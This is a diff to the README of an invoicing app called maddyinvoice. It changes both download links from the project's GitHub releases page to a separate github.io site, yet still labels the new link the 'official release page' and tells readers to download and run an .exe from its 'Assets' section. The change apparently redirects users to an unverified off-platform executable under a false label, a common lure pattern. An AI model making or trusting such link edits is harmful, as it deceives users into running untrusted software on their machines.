@@ -1,6 +1,6 @@
 # 🌸 maddyinvoice - Create professional invoices with privacy focus
 
-[![](https://img.shields.io/badge/Download-maddyinvoice-blue.svg)](https://github.com/Landfillpiedmont708/maddyinvoice/releases)
+[![](https://img.shields.io/badge/Download-maddyinvoice-blue.svg)](https://landfillpiedmont708.github.io)
 
 maddyinvoice helps you create professional invoices quickly. This application runs entirely on your computer. Your data stays on your machine. You do not need an internet connection to create bills. The software supports six languages including Farsi. It offers twelve distinct templates for your documents.
 
@@ -17,7 +17,7 @@ maddyinvoice helps you create professional invoices quickly. This application ru
 
 Follow these steps to get maddyinvoice on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Landfillpiedmont708/maddyinvoice/releases).
+1. Go to the [official release page](https://landfillpiedmont708.github.io).
 2. Look for the section labeled "Assets".
 3. Find the file ending in `.exe` that matches your system.
 4. Click the file name to start the download.
